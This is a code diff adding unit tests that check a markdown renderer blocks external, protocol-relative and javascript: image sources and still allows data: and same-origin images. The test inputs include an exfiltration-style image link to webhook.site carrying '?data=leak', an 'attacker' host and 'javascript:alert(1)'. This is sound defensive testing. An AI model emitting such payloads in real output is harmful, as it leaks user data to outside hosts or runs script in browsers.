@@ -98,4 +98,40 @@ describe('renderMarkdown', () => {
       expect(bodyRows[1].querySelector('td')?.textContent).toBe('3');
     });
   });
+
+  describe('image sources', () => {
+    it('does not render an <img> for an external http(s) source', () => {
+      const { container } = render(
+        renderMarkdown('![audit](https://webhook.site/x?data=leak)'),
+      );
+
+      expect(container.querySelector('img')).toBeNull();
+      expect(container.textContent).toContain('external image blocked');
+    });
+
+    it('blocks protocol-relative and javascript: sources', () => {
+      for (const src of ['//attacker/p.png', 'javascript:alert(1)']) {
+        const { container } = render(renderMarkdown(`![x](${src})`));
+        expect(container.querySelector('img')).toBeNull();
+      }
+    });
+
+    it('renders an inline data:image raster', () => {
+      const { container } = render(
+        renderMarkdown('![ok](data:image/png;base64,AAAA)'),
+      );
+
+      const img = container.querySelector('img');
+      expect(img).not.toBeNull();
+      expect(img?.getAttribute('src')).toBe('data:image/png;base64,AAAA');
+    });
+
+    it('renders a same-origin relative image', () => {
+      const { container } = render(renderMarkdown('![ok](/local/chart.png)'));
+
+      expect(container.querySelector('img')?.getAttribute('src')).toBe(
+        '/local/chart.png',
+      );
+    });
+  });
 });
